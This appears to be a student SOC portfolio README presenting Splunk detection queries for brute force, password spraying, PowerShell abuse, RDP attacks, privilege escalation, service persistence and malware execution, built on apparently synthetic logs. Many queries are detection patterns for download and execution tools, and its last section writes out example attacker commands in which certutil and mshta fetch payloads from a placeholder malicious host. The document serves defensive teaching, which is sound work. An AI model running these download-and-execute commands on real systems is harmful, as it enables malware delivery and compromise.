# Splunk SIEM Log Analysis Project

This project demonstrates how to upload and analyze logs using Splunk SIEM.

## Features
- Log ingestion
- Search & Reporting
- Alerting


## Tools Used
- Splunk Enterprise
- Windows Logs

## Steps
1. Install Splunk
2. Add data
3. Search logs using:
   ```spl
   index=main 

**Here, the main index is used because it is the default index in Splunk Enterprise. Splunk also provides an option to create separate custom indexes for organizing different types of log data.**

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

## 1. Bruteforce# Brute Force Detection Using Splunk ##

## Objective
Detect brute-force login attempts using Splunk SIEM by analyzing failed and successful login events.

## Queries Used

### Failed Login Attempts count by src_ip
```spl
index=main EventCode=4625 
| stats count by src_ip
```
- This query shows the count of failed login attempts based on source IP addresses.

### success Login Attempts count by src_ip
```spl
index=main EventCode=4624 
| stats count by src_ip
```
-This query shows the count of successful login attempts based on source IP addresses.


### Failed Login Attempts count by src_ip 
```spl
index=main status=failed user=administrator src_ip=45.67.210.12  OR index=main status=failed (src_ip=45.67.210.12 OR src_ip=77.120.10.88) 
```
-This query displays failed login events for the user administrator from the source IP address 45.67.210.12.

#### Main Brute Force Detection Alert Query
```spl
index=main status=failed
| bucket span=5m _time
| stats count by _time, user, src_ip
| where count > 5
```
-This alert detects more than 5 failed login attempts from the same source IP against a user within 5 minutes.

In the uploaded dataset, two suspicious IP addresses were identified performing multiple brute-force login attempts against user accounts.

## Suspicious ips (IOCs)

-45.67.210.** (Count of failed attempts = 80)
-77.120.10.** (Count of failed attempts = 40)

## Findings

-Multiple failed login attempts were detected from suspicious IP addresses.  
-Repeated authentication failures indicate brute-force attack behavior.  
-Suspicious activity targeted user authentication services.  

## conclusion 

-The investigation successfully identified brute-force attack attempts using Splunk SIEM. Detection queries and alert rules were created to monitor repeated failed authentication attempts   and suspicious login activity.

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

## 2. Successful Brute Force Detection Using Splunk ##

## Objective
-The objective of this investigation is to detect successful brute-force login attacks using Splunk SIEM by identifying multiple failed login attempts followed by a successful               authentication event from the same source IP address.

---

## Investigation Overview
-Authentication logs were analyzed in Splunk to identify suspicious login activity. The investigation focused on detecting attackers attempting repeated password guessing attacks against    user accounts.

---

## Queries Used

### Failed Login Attempts

```spl
index=bruteforce EventCode=4625
```
-Displays all failed login events.

### Successful Login Attempts
```
index=bruteforce EventCode=4624
```
-Displays all successful login events.

### Failed Login Count by Source IP
```
index=bruteforce EventCode=4625
| stats count by src_ip
```
-Shows the number of failed login attempts from each source IP address.

### Successful Login Count by Source IP
```
index=bruteforce EventCode=4624
| stats count by src_ip
```
-Shows the number of successful login attempts from each source IP address.

### Investigation of Suspicious Source IP
```
index=bruteforce EventCode=4625 src_ip=45.67.210.12
```
-Displays failed login attempts originating from a suspicious IP address.

### Successful Brute Force Detection Query
```
index=bruteforce (EventCode=4624 OR EventCode=4625)
| transaction user src_ip maxspan=5m
| search EventCode=4624 EventCode=4625
| where eventcount > 5
```
-Detects multiple failed login attempts followed by a successful login from the same source IP and user within 5 minutes.

## Suspicious ips (IOCs)

-45.67.210.** (Count of failed attempts = 133)
-77.120.10.** (Count of failed attempts = 139)

## Findings

-Multiple failed authentication attempts were detected from suspicious IP addresses.  
-Successful authentication after repeated failures indicates possible account compromise.  
-Brute-force attack behavior was successfully identified using Splunk SIEM.  

## Conclusion

-The investigation successfully identified successful brute-force attack activity using Splunk SIEM using custom authentication logs and SPL queries.

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

## 3. Password Spraying Detection Using Splunk ##

## Objective

-The objective of this investigation is to detect password spraying attacks using Splunk SIEM by identifying a single source IP attempting failed authentication attempts against multiple    user accounts within a short period of time.

## Investigation Overview

-Authentication logs were uploaded into Splunk and analyzed using SPL queries. The investigation focused on identifying suspicious login behavior where one source IP attempted to            authenticate against several user accounts using incorrect credentials.

## Queries Used

### Failed Login Attempts
```
index=pass-spray EventCode=4625
```
-Displays all failed authentication events.

### Successful Login Attempts
```
index=pass-spray EventCode=4624
```
-Displays all successful authentication events.

### Suspicious IP Detection Query
```
index=pass-spray EventCode=4625
| stats count by src_ip
| sort - count
```
-Displays source IP addresses generating the highest number of failed login attempts.

## Password Spraying Detection Query
```
index=pass-spray EventCode=4625
| stats dc(user) as targeted_users count by src_ip
| where targeted_users > 5 AND count > 15
| sort - count
```
-Detects a single source IP attempting failed logins against multiple user accounts.

### Users Targeted by Source IP
```
index=pass-spray EventCode=4625
| stats values(user) as targeted_users by src_ip
```
-Displays the user accounts targeted by each source IP address.

### Investigation of Suspicious Source IP
```
index=pass-spray src_ip=88.45.12.9
```
-Displays all authentication activity related to the suspicious source IP address.

### Successful Password Spraying Detection Query
```
index=pass-spray src_ip=88.45.12.9 (EventCode=4624 OR EventCode=4625)
| table _time EventCode user src_ip
| sort _time
```
-Displays failed authentication attempts followed by a successful login from the suspicious source IP.

### Compromised User Detection Query
```
index=pass-spray src_ip=88.45.12.9 EventCode=4624
| stats count by user
```
-Identifies the user account successfully authenticated from the malicious source IP.

## Suspicious IP Address Identified (IOCs)
Source IP  |  Activity
88.45.12.9 |  Password spraying attempts against multiple user accounts

## Findings

-Multiple failed login attempts were detected from a single source IP address.  
-The attacker targeted several user accounts within a short period of time.  
-Authentication behavior matched password spraying attack patterns.  
-A successful login event was observed after repeated failed attempts.  
-The compromised user account was identified through successful authentication events.  
-The suspicious source IP responsible for the attack activity was successfully identified.  

## Conclusion

-The investigation successfully identified password spraying activity using Splunk SIEM. SPL queries and authentication log analysis helped detect suspicious login behavior, identify        malicious source IPs, determine targeted user accounts, and detect successful compromise attempts.

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

## 4. PowerShell Abuse Detection Using Splunk ##

## Objective

-The objective of this investigation is to detect suspicious PowerShell abuse activity using Splunk SIEM by analyzing Windows authentication and process creation logs to identify malicious  PowerShell execution techniques, successful compromise attempts, privileged account usage, and account lockout activity.

## Investigation Overview

-Authentication and process creation logs were uploaded into Splunk and analyzed using SPL queries.  
-The investigation focused on identifying suspicious PowerShell execution activity commonly used by attackers after successful compromise.  
-Multiple PowerShell abuse techniques were detected including EncodedCommand execution, DownloadString payload activity, Invoke-WebRequest usage, and ExecutionPolicy Bypass attempts.   
-The investigation also identified successful compromise activity, privileged logon events, and account lockout activity related to suspicious source IP addresses.  

## Query

### Verify PowerShell Events
```
index=main EventCode=4688 process=powershell.exe
```
-Displays all PowerShell process execution events.

### Count Total PowerShell Executions
```
index=main EventCode=4688 process=powershell.exe
| stats count
```
-Counts total PowerShell execution events.

### Identify Users Executing PowerShell
```
index=main EventCode=4688 process=powershell.exe
| stats count by user
| sort -count
```
-Displays users executing PowerShell most frequently.

### Detect EncodedCommand Usage
```
index=main EventCode=4688 process=powershell.exe EncodedCommand
```
-Detects suspicious EncodedCommand execution.
 
# Why Suspicious ?
-Attackers commonly use EncodedCommand to hide malicious payloads and evade detection.

### Detect ExecutionPolicy Bypass
```
index=main EventCode=4688 process=powershell.exe
| search command="*ExecutionPolicy Bypass*"
```
-Detects attempts to bypass PowerShell security restrictions.

### Detect DownloadString Activity
```
index=main EventCode=4688 process=powershell.exe
| search command="*DownloadString*"
```
-Detects suspicious payload download activity using PowerShell.

### Detect Invoke-WebRequest Activity
```
index=main EventCode=4688 process=powershell.exe
| search command="*Invoke-WebRequest*"
```
-Detects PowerShell web request activity commonly used by attackers.

### Detect Multiple Suspicious PowerShell Techniques
```
index=main EventCode=4688 process=powershell.exe
| regex command="(?i)(encodedcommand|downloadstring|invoke-webrequest|executionpolicy bypass)"
```
-Detects multiple suspicious PowerShell abuse indicators together.

### Detect Suspicious Source IP
```
index=main EventCode=4688 process=powershell.exe
| stats count by src_ip
| sort -count
```
-Displays source IP addresses generating suspicious PowerShell activity.

### Investigate Attack Timeline
```
index=main src_ip="45.67.210.12" (EventCode=4624 OR EventCode=4688)
| table _time EventCode user src_ip process command status
| sort _time
```
-Displays successful compromise activity followed by suspicious PowerShell execution.

## Investigation Findings

-Successful login activity was observed.  
-Suspicious PowerShell execution occurred after successful authentication.  
-Encoded PowerShell commands were executed.  
-Payload download behavior was identified.  

### Detect Successful Compromise After Failed Attempts
```
index=main src_ip="45.67.210.12" (EventCode=4624 OR EventCode=4625)
| table _time EventCode user src_ip status
| sort _time
```
-Displays failed login attempts followed by successful authentication from the same suspicious source IP address.

### Identify Compromised User Account
```
index=main src_ip="45.67.210.12" EventCode=4624
| stats count by user
```
-Identifies successfully authenticated user account from the suspicious source IP.

### Detect Privileged Logon Activity
```
index=main EventCode=4672
| stats count by user,src_ip
| sort -count
```
-Detects privileged account logon activity after successful compromise.

# Why Important
-Attackers commonly attempt privileged access after compromising valid credentials.

### Investigate Privileged Logon Timeline
```
index=main src_ip="45.67.210.12" EventCode=4672
| table _time user src_ip privileges status
```
-Displays privileged logon activity associated with the suspicious source IP.

### Detect Account Lockout Activity
```
index=main EventCode=4740
| stats count by user,src_ip
| sort -count
```
-Detects account lockout events caused by repeated failed login attempts.

### Investigate Locked Accounts
```
index=main EventCode=4740
| table _time user src_ip status
| sort _time
```
-Displays locked user accounts and related source IP addresses.

### Final PowerShell Abuse Detection Query
```
index=main EventCode=4688 process=powershell.exe
| regex command="(?i)(encodedcommand|downloadstring|invoke-webrequest|executionpolicy bypass)"
| stats count by user,src_ip,command
| sort -count
```

## Detection Logic

-EncodedCommand execution  
-DownloadString usage  
-Invoke-WebRequest activity  
-ExecutionPolicy Bypass attempts  
-Suspicious PowerShell abuse behavior  

### Alert Query
```
index=main EventCode=4688 process=powershell.exe
| regex command="(?i)(encodedcommand|downloadstring|invoke-webrequest|executionpolicy bypass)"
```

## Findings

-Suspicious PowerShell activity was successfully detected.  
-Encoded PowerShell commands were identified.  
-Execution policy bypass attempts were detected.  
-PowerShell download activity was observed.  
-Successful compromise activity occurred before PowerShell abuse.  
-Privileged logon events were detected after successful authentication.  
-Account lockout activity indicated repeated failed login attempts.  
-The suspicious source IP and compromised user account were successfully identified.  
-Authentication and process creation logs helped build a complete attack timeline.  

## Conclusion

-The investigation successfully identified suspicious PowerShell abuse activity using Splunk SIEM.  
-SPL queries and Windows process creation logs helped detect attacker behavior, identify compromised systems, analyze suspicious command execution, detect privileged access attempts, and    identify account lockout activity.  
-The investigation demonstrated realistic SOC analyst workflows including authentication analysis, PowerShell abuse detection, privileged access monitoring, attack timeline investigation,   and alert creation.  

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

## 5. RDP Brute Force Detection Using Splunk ##

## Objective

-Detect RDP brute-force attacks by analyzing failed and successful RDP authentication events and identifying malicious source IPs.

## Investigation Queries

### View All Successful RDP Logins
```
index=rdp-bruteforce EventCode=4624
| stats count by src_ip
| sort - count
```
-Displays source IPs generating successful RDP logins.
-Helps establish a baseline of legitimate RDP activity.

### View All Failed RDP Logins
```
index=rdp-bruteforce EventCode=4625
| stats count by src_ip
| sort - count
```
-Displays source IPs generating failed RDP logins.
-High counts may indicate brute-force activity.

### Compare Successful and Failed Logins
```
index=rdp-bruteforce (EventCode=4624 OR EventCode=4625)
| stats count by src_ip EventCode
```
-Shows successful and failed login counts per source IP.

### Identify Suspicious IP Address
```
index=rdp-bruteforce EventCode=4625 LogonType=10
| stats count by src_ip
| sort - count
```
-The IP with the highest failed RDP attempts is the primary suspect.

### Investigate Suspicious IP Activity
```
index=rdp-bruteforce src_ip=185.199.110.77
| table _time EventCode user src_ip dest_ip dest_port hostname status
| sort _time
```
-Displays the complete activity timeline of the suspicious IP.

### Identify Targeted User Accounts
```
index=rdp-bruteforce src_ip=185.199.110.77 EventCode=4625
| stats values(user) as targeted_users
```
-Shows all accounts targeted during the attack.

### Verify Successful Login After Failed Attempts
```
index=rdp-bruteforce src_ip=185.199.110.77
| table _time EventCode user status
| sort _time
```

### Identify the Compromised User
```
index=rdp-bruteforce src_ip=185.199.110.77 EventCode=4624
| stats count by user
```
-Identifies the account that was successfully accessed.

### Main Detection Query
```
index=rdp-bruteforce EventCode=4625 LogonType=10
| bucket span=5m _time
| stats count by _time src_ip user
| where count > 10
```
-Detects more than 10 failed RDP login attempts from the same IP within 5 minutes.

## Findings

-Multiple failed RDP authentication attempts were detected.  
-Source IP 185.199.110.77 generated the highest number of failed logins.  
-The attacker targeted the administrator account.  
-Activity occurred over RDP (LogonType=10, dest_port=3389).  
-A successful login (4624) was observed after repeated failures.  
-The compromised account was identified through successful authentication events.  

## Conclusion

-The investigation confirmed an RDP brute-force attack where a malicious source IP performed multiple failed RDP authentication attempts against a target system and eventually obtained      successful access to the administrator account. This activity indicates potential unauthorized remote access and should be escalated for containment and remediation.

**Note:** Normal login activity is present in the dataset, while RDP brute-force attempts are identified by LogonType=10 and dest_port=3389, showing multiple failed logins followed by a successful compromise from the same source IP.

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

## 6. Privilege Escalation Detection Using Splunk ##

## Objective

-Detect privilege escalation activity by identifying suspicious logins, privileged account assignments, account creation events, and administrator group membership changes.

## Investigation Overview

-Windows authentication and privilege-related logs were analyzed to identify unauthorized privilege escalation activity. The investigation focused on detecting elevated privileges, newly    created accounts, administrator group modifications, and suspicious source IP activity.

## Investigation Queries

### View Successful Logins
```
index=privilege-escalation EventCode=4624
| stats count by src_ip
| sort - count
```
-Displays successful login activity by source IP.

### View Failed Logins
```
index=privilege-escalation EventCode=4625
| stats count by src_ip
| sort - count
```
-Displays failed login activity by source IP.

### Find Suspicious Source IP
```
index=privilege-escalation
| stats count by src_ip
| sort - count
```
-Displays all source IPs by activity count.
-Helps identify unusual or suspicious IP addresses.

### Investigate Suspicious Source IP Activity
```
index=privilege-escalation src_ip=185.199.110.77
| sort _time
```
-Displays all activity generated by the suspicious source IP.

### Identify Users Receiving Special Privileges
```
index=privilege-escalation EventCode=4672
| stats count by user
```
Displays accounts assigned special privileges.

### Detect Newly Created Accounts
```
index=privilege-escalation EventCode=4720
| table _time actor target_user src_ip hostname
```
Displays newly created user accounts.

### Detect Administrator Group Membership Changes
```
index=privilege-escalation EventCode=4732
| table _time actor target_user group src_ip hostname
```
-Displays users added to the Administrators group.

### View Full Attack Timeline
```
index=privilege-escalation src_ip=185.199.110.77
| table _time EventCode user actor target_user privilege group src_ip hostname
| sort _time
```
-Displays the complete privilege escalation sequence.

### Identify Backdoor Account
```
index=privilege-escalation EventCode=4720
| stats values(target_user) as created_accounts by actor
```
-Identifies newly created accounts that may be used for persistence.

### Verify Login Using Created Account
```
index=privilege-escalation user=backup_admin EventCode=4624
```
-Confirms successful login using the newly created administrator account.

### Main Privilege Escalation Detection Query
```
index=privilege-escalation (EventCode=4672 OR EventCode=4720 OR EventCode=4732)
| table _time EventCode user actor target_user privilege group src_ip hostname
| sort _time
```
-Detects privilege assignment, account creation, and administrator group modifications.

## Findings
-Source IP 185.199.110.77 was identified as suspicious during the investigation.  
-User john successfully authenticated from the suspicious source IP.  
-Special privileges were assigned to john (EventCode=4672).  
-A new account named backup_admin was created (EventCode=4720).  
-The newly created account was added to the Administrators group (EventCode=4732).  
-The backup_admin account later successfully logged in.  
-The activity indicates successful privilege escalation followed by persistence establishment.  

## Attack Timeline
10:30:00  EventCode=4624  john logged in from 185.199.110.77
      ↓
10:32:00  EventCode=4672  Special privileges assigned to john
      ↓
10:34:00  EventCode=4720  backup_admin account created
      ↓
10:35:00  EventCode=4732  backup_admin added to Administrators group
      ↓
10:37:00  EventCode=4624  backup_admin successfully logged in

## Conclusion

-The investigation identified a privilege escalation attack originating from 185.199.110.77. The attacker obtained privileged access, created a new administrative account (backup_admin),    added it to the Administrators group, and successfully logged in using the newly created account. This activity demonstrates both privilege escalation and persistence techniques commonly   observed in real-world attacks.

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

## 7. Service Installation Persistence Detection Using Splunk ##

## Objective

-Detect persistence mechanisms established through Windows service installation by identifying suspicious service creation events and correlating them with compromised user activity.

## Investigation Overview

-Windows authentication and service-related logs were analyzed to identify persistence techniques used by an attacker after gaining privileged access. The investigation focused on           detecting newly installed services, suspicious service names, associated user accounts, and the source IP responsible for the activity.

## Investigation Queries

### View Successful Logins
```
index=service-installation EventCode=4624
| stats count by src_ip
| sort - count
```
-Displays successful login activity by source IP.

### View Failed Logins
```
index=service-installation EventCode=4625
| stats count by src_ip
| sort - count
```
-Displays failed login activity by source IP.

### Find Suspicious Source IP
```
index=service-installation
| stats count by src_ip
| sort - count
```
-Displays source IPs generating activity in the environment.

### Detect Installed Services
```
index=service-installation EventCode=4697
```
-Displays all service installation events.

### Detect Service Creation Events
```
index=service-installation EventCode=7045
```
-Displays service creation and registration events.

### Count Installed Services
```
index=service-installation EventCode=4697
| stats count by service_name
```
-Shows installed services and their occurrence count.

### Investigate Service Installation Activity
```
index=service-installation EventCode=4697
| table _time actor service_name service_path src_ip hostname
```
-Displays details of installed services.

### Investigate Suspicious Source IP
```
index=service-installation src_ip=185.199.110.77
| sort _time
```
-Displays all activity from the suspicious source IP.

### View Full Attack Timeline
```
index=service-installation src_ip=185.199.110.77
| table _time EventCode actor user service_name service_path start_type src_ip hostname
| sort _time
```
Displays the complete persistence attack timeline.

### Investigate Compromised Account Activity
```
index=service-installation user=backup_admin
```
-Displays activity associated with the compromised account.

### Main Persistence Detection Query
```
index=service-installation (EventCode=4697 OR EventCode=7045)
| table _time EventCode actor service_name service_path start_type src_ip hostname
| sort _time
```
-Detects newly installed services and service creation activity.

### Malicious Service Detection Query
```
index=service-installation EventCode=4697
| stats values(service_path) as path by service_name
```
- Identifies suspicious service names and executable paths.

## Findings

-Source IP 185.199.110.77 was identified as suspicious.  
-User backup_admin successfully authenticated to the host.  
-A service named WindowsUpdateSvc was installed.  
-The service was configured for automatic startup.  
-A second service named SystemMonitor was later installed.  
-Service installation activity originated from the same suspicious source IP.  
-The behavior indicates persistence establishment following privilege escalation.  

## Attack Timeline

10:30:00  EventCode=4624  backup_admin login
      ↓
10:32:00  EventCode=4697  WindowsUpdateSvc installed
      ↓
10:33:00  EventCode=7045  Service configured for Auto Start
      ↓
10:35:00  EventCode=4624  backup_admin login
      ↓
10:37:00  EventCode=4697  SystemMonitor service installed
\
## Conclusion

-The investigation identified persistence activity originating from 185.199.110.77. After obtaining privileged access through the backup_admin account, the attacker installed multiple       Windows services and configured one for automatic startup. This behavior is consistent with persistence techniques used by attackers to maintain long-term access to compromised systems.

## Suspicious Indicators

Source IP        : 185.199.110.77  
Hostname         : DC01  
Compromised User : backup_admin  
Service 1        : WindowsUpdateSvc  
Service 2        : SystemMonitor  
Persistence Type : Windows Service Installation  
Event IDs        : 4697, 7045  

---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

## 8. Malware Execution Detection Using Splunk ##

## Objective

-Detect malware execution activity by identifying suspicious process creation events, PowerShell abuse, payload downloads, and malicious tools executed after persistence has been            established on a compromised host.

## Investigation Overview

-Windows process creation and PowerShell logs were analyzed to identify malicious activity performed by an attacker after gaining administrative access. The investigation focused on         detecting suspicious processes, encoded PowerShell commands, payload downloads, and identifying the compromised account and source IP.

## Investigation Queries

### View Successful Logins
```
index=malware-exe EventCode=4624
| stats count by src_ip
| sort - count
```
-Displays successful login activity by source IP.

### View Failed Logins
```
index=malware-exe EventCode=4625
| stats count by src_ip
| sort - count
```
-Displays failed login activity by source IP.

### Find Suspicious Source IP
```
index=malware-exe
| stats count by src_ip
| sort - count
```
-Displays source IPs generating activity.  
-Helps identify abnormal hosts performing malicious actions.  

### View All Process Creation Events
```
index=malware-exe EventCode=4688
```
-Displays all executed processes.

### Count Executed Processes
```
index=malware-exe EventCode=4688
| stats count by process_name
| sort - count
```
-Shows process execution frequency.

### Detect PowerShell Execution
```
index=malware-exe EventCode=4688 process_name=powershell.exe
```
-Displays PowerShell activity.

### Detect Encoded PowerShell Commands
```
index=malware-exe EventCode=4688 process_name=powershell.exe
| search command_line="*EncodedCommand*"
```
-Detects obfuscated PowerShell commands commonly used by attackers.

### Detect PowerShell Script Execution
```
index=malware-exe EventCode=4104
```
-Displays PowerShell Script Block Logging events.

### Detect Certutil Usage
```
index=malware-exe EventCode=4688 process_name=certutil.exe
```
-Detects payload download attempts using Certutil.

### Detect Rundll32 Usage
```
index=malware-exe EventCode=4688 process_name=rundll32.exe
```
-Detects DLL execution through Rundll32.

### Detect Mshta Usage
```
index=malware-exe EventCode=4688 process_name=mshta.exe
```
-Detects HTA-based malware execution.

### Investigate Suspicious Source IP
```
index=malware-exe src_ip=185.199.110.77
| sort _time
```
-Displays all activity performed by the suspicious IP.

### Investigate Compromised Account Activity
```
index=malware-exe user=backup_admin
| sort _time
```
-Displays activity performed by the compromised account.

### View Full Attack Timeline
```
index=malware-exe src_ip=185.199.110.77
| table _time EventCode user process_name command_line src_ip hostname
| sort _time
```
-Displays the complete malware execution sequence.

### Main Malware Execution Detection Query
```
index=malware-exe EventCode=4688
| search process_name IN ("powershell.exe","certutil.exe","payload.exe","rundll32.exe","mshta.exe")
| table _time user process_name command_line src_ip hostname
| sort _time
```
-Detects commonly abused attacker tools and malware processes.

## Findings
-Source IP 185.199.110.77 was identified as suspicious.  
-The compromised account backup_admin executed multiple suspicious processes.  
-PowerShell was executed using an encoded command.  
-Certutil was used to download a payload from a remote location.  
-A malicious executable (payload.exe) was launched.  
-Rundll32 was used to execute a DLL payload.  
-Mshta was used to execute a remote HTA file.  
-The activity indicates malware execution following successful persistence establishment.  

## Attack Timeline  
10:30:00  EventCode=4624  backup_admin login  
      ↓
10:32:00  EventCode=4688  powershell.exe (Encoded Command)  
      ↓
10:33:00  EventCode=4104  PowerShell Script Executed  
      ↓
10:34:00  EventCode=4688  certutil.exe downloads payload  
      ↓
10:35:00  EventCode=4688  payload.exe executed  
      ↓
10:37:00  EventCode=4688  rundll32.exe launched  
      ↓
10:39:00  EventCode=4688  cmd.exe executed  
      ↓
10:41:00  EventCode=4624  backup_admin login  
      ↓
10:43:00  EventCode=4688  mshta.exe launched  
      ↓
10:45:00  EventCode=4688  powershell.exe executed  

## Conclusion

-The investigation identified malware execution activity originating from 185.199.110.77 using the compromised account backup_admin. The attacker leveraged PowerShell, Certutil, Rundll32,   and Mshta to download and execute malicious payloads. These activities indicate active post-compromise malware execution and represent a significant security risk requiring immediate       containment and remediation.

## Suspicious Indicators  

Source IP        : 185.199.110.77  
Hostname         : DC01  
Compromised User : backup_admin  

Suspicious Processes:
- powershell.exe  
- certutil.exe  
- payload.exe  
- rundll32.exe  
- mshta.exe  

Event IDs:
- 4688 (Process Creation)  
- 4104 (PowerShell Script Block Logging)  

Attack Stage:
Malware Execution / Post-Exploitation  

## How This Attack Works

-After successfully gaining access and establishing persistence on the system, attackers typically execute malicious tools and payloads to expand control over the compromised host.         Malware execution is one of the most critical stages of an attack because it allows the attacker to perform actions such as downloading additional malware, stealing credentials, moving    laterally, or preparing for data exfiltration.

# In this scenario, the attacker uses the compromised account backup_admin to execute several suspicious processes commonly abused in real-world attacks:

## 1. PowerShell Execution

-The attacker launches powershell.exe with an encoded command to hide malicious activity and evade detection.

Example:
```
powershell.exe -EncodedCommand <Base64_String>
```
Purpose:

Execute malicious scripts  
Download payloads  
Bypass security controls  
Evade detection through obfuscation  

## 2. Payload Download Using Certutil

-The attacker uses certutil.exe, a legitimate Windows utility, to download a malicious file from a remote server.

Example:
```
certutil.exe -urlcache -split -f http://malicious.site/payload.exe payload.exe
```
Purpose:

Download malware from attacker-controlled infrastructure  
Avoid using third-party tools that may trigger security alerts  

## 3. Malware Execution

-After downloading the payload, the attacker executes the malware.

Example:
```
payload.exe
```
Purpose:

Establish command execution  
Deploy ransomware or trojans  
Collect credentials  
Prepare for lateral movement  

## 4. DLL Execution Using Rundll32

-The attacker uses rundll32.exe to execute malicious DLL files.

Example:
```
rundll32.exe payload.dll,Start
```
Purpose:

Execute malicious code through a trusted Windows binary  
Blend malicious activity with normal system processes  

## 5. HTA Execution Using Mshta

-The attacker uses mshta.exe to execute remote HTA files.

Example:
```
mshta.exe http://malicious.site/dropper.hta
```
Purpose:

Download and execute additional payloads  
Establish persistence  
Execute attacker-controlled scripts  
